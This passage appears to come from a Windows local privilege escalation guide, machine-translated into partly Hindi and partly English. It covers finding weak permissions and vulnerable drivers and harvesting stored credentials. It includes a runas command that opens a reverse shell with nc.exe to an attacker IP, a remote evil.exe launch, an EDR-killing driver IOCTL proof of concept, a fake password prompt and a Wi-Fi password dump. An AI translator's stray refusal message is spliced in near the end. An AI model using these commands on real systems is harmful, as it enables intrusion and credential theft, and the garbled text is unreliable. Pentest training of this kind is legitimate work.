Windows उपयोगकर्ताओं को यह निर्धारित करने की अनुमति देता है कि यदि कोई सेवा असफल हो तो क्या कार्रवाई की जानी चाहिए। इस फीचर को किसी बाइनरी की ओर पॉइंट करने के लिए कॉन्फ़िगर किया जा सकता है। यदि यह बाइनरी प्रतिस्थापनीय है, तो privilege escalation संभव हो सकता है। अधिक जानकारी [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## अनुप्रयोग

### इंस्टॉल किए गए अनुप्रयोग

जाँचें **बाइनरीज़ की अनुमतियाँ** (शायद आप किसी को ओवरराइट करके privilege escalation कर सकें) और **फ़ोल्डरों** की ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### लिखने की अनुमति

जाँचें कि क्या आप किसी config file को संशोधित करके किसी विशेष फ़ाइल को पढ़ सकते हैं या क्या आप किसी binary को संशोधित कर सकते हैं जिसे Administrator account (schedtasks) द्वारा चलाया जाएगा।

सिस्टम में कमजोर folder/files permissions खोजने का एक तरीका है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### स्टार्टअप पर चलाएँ

**जाँचें कि क्या आप किसी registry या binary को overwrite कर सकते हैं जिसे किसी दूसरे user द्वारा execute किया जाएगा।**\  
**पढ़ें** **निम्नलिखित पृष्ठ** में दिलचस्प **autoruns locations to escalate privileges** के बारे में और जानने के लिए:

{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### ड्राइवर्स

संभावित **third party weird/vulnerable** drivers की तलाश करें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
If a driver exposes an arbitrary kernel read/write primitive (common in poorly designed IOCTL handlers), you can escalate by stealing a SYSTEM token directly from kernel memory. See the step‑by‑step technique here:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

Some signed third‑party drivers create their device object with a strong SDDL via IoCreateDeviceSecure but forget to set FILE_DEVICE_SECURE_OPEN in DeviceCharacteristics. Without this flag, the secure DACL is not enforced when the device is opened through a path containing an extra component, letting any unprivileged user obtain a handle by using a namespace path like:

- \\.\DeviceName\\anything
- \\.\amsdk\\anyfile (from a real-world case)

Once a user can open the device, privileged IOCTLs exposed by the driver can be abused for LPE and tampering. Example capabilities observed in the wild:
- arbitrary processes के लिए full-access handles लौटाना (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- अनियंत्रित raw disk read/write (offline tampering, boot-time persistence tricks).
- arbitrary processes को terminate करना, जिसमें Protected Process/Light (PP/PPL) शामिल हैं, जिससे user land से kernel के माध्यम से AV/EDR kill संभव हो जाता है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations for developers
- जब DACL द्वारा प्रतिबंधित किए जाने वाले device objects बनाए जा रहे हों तो हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- Privileged operations के लिए caller context को सत्यापित करें। process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को सीमित करें (access masks, METHOD_*, input validation) और सीधे kernel privileges के बजाय brokered models पर विचार करें।

Detection ideas for defenders
- संदिग्ध device names (e.g., \\ .\\amsdk*) के user-mode opens और दुरुपयोग के संकेत देने वाली specific IOCTL sequences की निगरानी करें।
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) लागू करें और अपनी allow/deny lists बनाए रखें।


## PATH DLL Hijacking

यदि आपके पास **write permissions inside a folder present on PATH** हैं तो आप किसी process द्वारा लोड की गई DLL को hijack करके **escalate privileges** कर सकते हैं।

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
इस check का दुरुपयोग कैसे किया जाए, इस बारे में अधिक जानकारी के लिए:


{{#ref}}
dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

## नेटवर्क

### शेयर
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में हार्डकोड किए गए अन्य ज्ञात कंप्यूटरों के लिए जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

बाहर से **restricted services** के लिए जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग तालिका
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP टेबल
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(नियम सूचीबद्ध करें, नियम बनाएं, बंद करें, बंद करें...)**

अधिक[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
बाइनरी `bash.exe` को `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में भी पाया जा सकता है

यदि आप root user बन जाते हैं तो आप किसी भी पोर्ट पर सुन सकते हैं (पहली बार जब आप `nc.exe` का उपयोग किसी पोर्ट पर सुनने के लिए करेंगे तो यह GUI के माध्यम से पूछेगा कि `nc` को firewall द्वारा अनुमति दी जानी चाहिए या नहीं)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash को root के रूप में आसानी से शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं।

आप `WSL` फ़ाइल सिस्टम को फ़ोल्डर `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` में एक्सप्लोर कर सकते हैं।

## Windows क्रेडेंशियल्स

### Winlogon क्रेडेंशियल्स
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### क्रेडेंशियल मैनेजर / Windows वॉल्ट

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault सर्वर, वेबसाइट और अन्य प्रोग्रामों के लिए उपयोगकर्ता क्रेडेंशियल्स संग्रहीत करता है जिन्हें **Windows** **उपयोगकर्ताओं को स्वचालित रूप से लॉग इन कर सकता है**। पहली नज़र में ऐसा लग सकता है कि उपयोगकर्ता अपने Facebook credentials, Twitter credentials, Gmail credentials आदि यहाँ स्टोर कर सकते हैं ताकि ब्राउज़र के जरिए वे स्वचालित रूप से लॉग इन हो सकें। पर ऐसा नहीं है।

Windows Vault उन क्रेडेंशियल्स को स्टोर करता है जिनसे Windows उपयोगकर्ताओं को स्वचालित रूप से लॉग इन कर सकता है, जिसका मतलब यह है कि कोई भी **Windows application that needs credentials to access a resource** (server या वेबसाइट) **can make use of this Credential Manager** & Windows Vault और दिए गए क्रेडेंशियल्स का उपयोग कर सकता है, बजाय इसके कि उपयोगकर्ता बार-बार username और password दर्ज करें।

जब तक applications Credential Manager के साथ इंटरैक्ट न करें, मुझे नहीं लगता कि वे किसी दिए गए resource के लिए क्रेडेंशियल्स का उपयोग कर पाएंगे। इसलिए, अगर आपकी application vault का उपयोग करना चाहती है, तो उसे किसी न किसी तरह से **communicate with the credential manager and request the credentials for that resource** from the default storage vault करना चाहिए।

मशीन पर स्टोर किए गए क्रेडेंशियल्स को सूचीबद्ध करने के लिए `cmdkey` का उपयोग करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप सहेजे गए क्रेडेंशियल्स का उपयोग करने के लिए `runas` को `/savecred` विकल्प के साथ उपयोग कर सकते हैं। निम्नलिखित उदाहरण एक SMB share के माध्यम से remote binary को कॉल कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credential सेट के साथ `runas` का उपयोग।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
ध्यान दें कि mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), या [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) से।

### DPAPI

The **Data Protection API (DPAPI)** डेटा के symmetric encryption के लिए एक तरीका प्रदान करता है, जो मुख्य रूप से Windows ऑपरेटिंग सिस्टम में asymmetric private keys के symmetric encryption के लिए उपयोग होता है। यह encryption उपयोगकर्ता या सिस्टम secret का उपयोग करके entropy में महत्वपूर्ण योगदान देता है।

**DPAPI उपयोगकर्ता के login secrets से व्युत्पन्न एक symmetric key के माध्यम से keys के encryption को सक्षम करता है**। सिस्टम encryption वाले परिदृश्यों में यह सिस्टम के domain authentication secrets का उपयोग करता है।

DPAPI का उपयोग करके encrypted user RSA keys `%APPDATA%\Microsoft\Protect\{SID}` डायरेक्टरी में संग्रहीत होते हैं, जहाँ `{SID}` उपयोगकर्ता के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) का प्रतिनिधित्व करता है। **The DPAPI key, co-located with the master key that safeguards the user's private keys in the same file**, आमतौर पर 64 bytes की random data से बना होता है। (यह ध्यान देने योग्य है कि इस डायरेक्टरी तक पहुँच प्रतिबंधित है, इसलिए CMD में `dir` कमांड के जरिए इसकी सामग्री सूचीबद्ध नहीं की जा सकती, हालांकि इसे PowerShell के माध्यम से सूचीबद्ध किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप इसे डिक्रिप्ट करने के लिए उपयुक्त arguments (`/pvk` या `/rpc`) के साथ **mimikatz module** `dpapi::masterkey` का उपयोग कर सकते हैं।

**credentials files protected by the master password** आमतौर पर निम्न स्थानों पर पाए जाते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
आप उपयुक्त `/masterkey` के साथ **mimikatz module** `dpapi::cred` का उपयोग करके **decrypt** कर सकते हैं.\
आप `sekurlsa::dpapi` module के साथ **memory** से कई **DPAPI** **masterkeys** **extract** कर सकते हैं (यदि आप **root** हैं).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** का उपयोग अक्सर **scripting** और automation कार्यों के लिए किया जाता है ताकि encrypted credentials को सुविधाजनक तरीके से संग्रहीत किया जा सके। ये credentials **DPAPI** द्वारा संरक्षित होते हैं, जिसका सामान्यतः मतलब है कि इन्हें केवल उसी user द्वारा उसी computer पर ही **decrypt** किया जा सकता है जहाँ इन्हें बनाया गया था।

किसी फ़ाइल में मौजूद PS credentials को **decrypt** करने के लिए आप निम्न कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### सहेजे गए RDP कनेक्शन

आप इन्हें इन स्थानों पर पा सकते हैं `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### हाल ही में चलाए गए कमांड
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **रिमोट डेस्कटॉप क्रेडेंशियल मैनेजर**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
आप मेमोरी से **DPAPI masterkeys** को Mimikatz `sekurlsa::dpapi` module के साथ **extract many DPAPI masterkeys** कर सकते हैं

### Sticky Notes

लोग अक्सर Windows workstations पर StickyNotes app का उपयोग अन्य जानकारी और **save passwords** रखने के लिए करते हैं, यह समझे बिना कि यह एक database फ़ाइल है। यह फ़ाइल `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` पर स्थित होती है और इसे ढूँढना और जांचना हमेशा उपयोगी होता है।

### AppCmd.exe

**ध्यान दें कि AppCmd.exe से passwords recover करने के लिए आपको Administrator होना चाहिए और इसे High Integrity level पर चलाना होगा.**\
**AppCmd.exe** `%systemroot%\system32\inetsrv\` directory में स्थित है।\
यदि यह फ़ाइल मौजूद है तो संभव है कि कुछ **credentials** configure किए गए हों और उन्हें **recovered** किया जा सके।

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जाँचें कि `C:\Windows\CCM\SCClient.exe` exists .\
इंस्टॉलर **SYSTEM privileges के साथ चलाए जाते हैं**, कई **DLL Sideloading (जानकारी से** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**) के प्रति प्रवण हैं।
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फ़ाइलें और रजिस्ट्री (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH keys in registry

SSH private keys को रजिस्ट्री कुंजी `HKCU\Software\OpenSSH\Agent\Keys` के अंदर संग्रहीत किया जा सकता है, इसलिए आपको यह जांचना चाहिए कि वहाँ कुछ रोचक है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आप उस path के अंदर कोई entry पाते हैं तो वह शायद एक saved SSH key होगी। यह स्टोरencrypted है लेकिन इसे आसानी से [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
इस तकनीक के बारे में अधिक जानकारी यहाँ है: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service चल नहीं रही है और आप चाहते हैं कि यह बूट पर स्वतः शुरू हो तो चलाएँ:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह तकनीक अब मान्य नहीं है। मैंने कुछ ssh keys बनाने, उन्हें `ssh-add` से जोड़ने और ssh द्वारा एक मशीन में लॉगिन करने की कोशिश की। रजिस्ट्री HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के उपयोग की पहचान नहीं की।

### अनदेखी फ़ाइलें
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM बैकअप्स
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### क्लाउड क्रेडेंशियल्स
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

### कैश्ड GPP पासवर्ड

एक फीचर पहले उपलब्ध था जो Group Policy Preferences (GPP) के माध्यम से मशीनों के एक समूह पर custom local administrator accounts तैनात करने की अनुमति देता था। हालांकि, इस विधि में महत्वपूर्ण सुरक्षा कमजोरियाँ थीं। सबसे पहले, Group Policy Objects (GPOs), जो SYSVOL में XML फ़ाइलों के रूप में स्टोर होते हैं, किसी भी domain user द्वारा एक्सेस किए जा सकते थे। दूसरे, इन GPPs के भीतर के passwords, जो AES256 से encrypt किए गए थे और एक publicly documented default key का उपयोग करते थे, किसी भी authenticated user द्वारा decrypt किए जा सकते थे। इससे गंभीर जोखिम उत्पन्न होता था, क्योंकि यह उपयोगकर्ताओं को elevated privileges हासिल करने की अनुमति दे सकता था।

इस जोखिम को कम करने के लिए, एक function विकसित किया गया था जो locally cached GPP फाइलों के लिए scan करता है जिनमें एक "cpassword" field खाली नहीं होता। ऐसी फाइल मिलने पर, function password को decrypt करता है और एक custom PowerShell object return करता है। इस object में GPP और फाइल के location के बारे में विवरण शामिल होते हैं, जिससे इस सुरक्षा कमजोरी की पहचान और समाधान में मदद मिलती है।

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (Windows Vista से पहले)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword को decrypt करने के लिए:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec का उपयोग करके passwords प्राप्त करना:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Config
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
web.config में credentials का उदाहरण:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN क्रेडेंशियल्स
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Logs
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials के लिए पूछें

आप हमेशा **user से उसके credentials या यहां तक कि किसी अन्य user के credentials दर्ज करने के लिए पूछ सकते हैं** अगर आपको लगता है कि वह उन्हें जानता/जान सकती है (ध्यान दें कि क्लाइंट से सीधे **पूछना** यानी सीधे **credentials** माँगना वास्तव में **जोखिम भरा** है):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **संभावित फ़ाइलनाम जिनमें credentials हो सकते हैं**

जानी-पहचानी फ़ाइलें जो कुछ समय पहले **passwords** को **clear-text** या **Base64** में रखती थीं।
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don't have access to your filesystem or repository. Please paste the contents of src/windows-hardening/windows-local-privilege-escalation/README.md (or the files you want translated). Once you provide the file text, I'll translate the English parts to Hindi while preserving all markdown, links, tags, paths, and code exactly as you requested.
```
cd C:\
